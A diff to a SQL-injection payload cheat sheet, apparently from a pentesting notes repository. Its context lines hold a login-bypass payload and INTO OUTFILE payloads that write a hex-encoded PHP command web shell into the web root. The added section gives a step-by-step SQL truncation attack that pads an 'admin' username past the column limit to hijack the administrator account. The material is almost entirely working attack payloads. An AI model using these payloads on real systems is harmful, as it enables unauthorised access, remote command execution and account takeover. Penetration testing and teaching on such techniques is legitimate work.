@@ -141,3 +141,35 @@ admin' OR 1=1#
 ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E--
 ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
 ```
+
+<br />
+
+## Truncation Attack
+
+```sh
+# If the table shema is like the following...
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+
+
+# -------------------------------------------------------
+
+# POST request
+POST /create-user HTTP/1.1
+...
+
+# Create another new "admin" with more than 64 characters. Btw, "+" means the spaces.
+username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random&password=password
+# ---------------------------------------------------------
+
+# Then, login with your new admin credential.
+username=admin&password=password
+
+# Or fetch the admin's information.
+SELECT * FROM users WHERE username='admin';
+# Return the values are the real admin's information.
+username = admin
+password = <REAL_ADMIN_PASSWORD>
+```
